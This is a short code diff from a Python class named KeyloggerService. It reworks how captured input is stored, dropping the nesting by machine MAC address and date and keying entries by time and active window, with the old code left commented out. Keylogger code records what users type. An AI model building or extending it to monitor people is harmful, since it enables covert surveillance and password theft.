@@ -76,18 +76,26 @@ class KeyloggerService:
 
     def __add_to_data(self, dictionary: dict, data: str):
         self.__update_current_window()
-        current_date = self.__current_date()
         current_time = self.__current_time()
-        mac = get_mac_address()
-        if not dictionary.get(mac):
-            dictionary[mac]={}
-        if not current_date in dictionary[mac]:
-            dictionary[mac][current_date] = {}
-        if not current_time in dictionary[mac][current_date]:
-            dictionary[mac][current_date][current_time] = {}
-        if not self.__current_window in dictionary[mac][current_date][current_time]:
-            dictionary[mac][current_date][current_time][self.__current_window] = []
-        dictionary[mac][current_date][current_time][self.__current_window].append(data)
+        if current_time not in dictionary:
+            dictionary[current_time] = {}
+        if self.__current_window not in dictionary[current_time]:
+            dictionary[current_time][self.__current_window] = []
+        dictionary[current_time][self.__current_window].append(data)
+
+
+        # current_date = self.__current_date()
+        # current_time = self.__current_time()
+        # mac = get_mac_address()
+        # if not dictionary.get(mac):
+        #     dictionary[mac]={}
+        # if not current_date in dictionary[mac]:
+        #     dictionary[mac][current_date] = {}
+        # if not current_time in dictionary[mac][current_date]:
+        #     dictionary[mac][current_date][current_time] = {}
+        # if not self.__current_window in dictionary[mac][current_date][current_time]:
+        #     dictionary[mac][current_date][current_time][self.__current_window] = []
+        # dictionary[mac][current_date][current_time][self.__current_window].append(data)
 
 
     def __enter__(self):
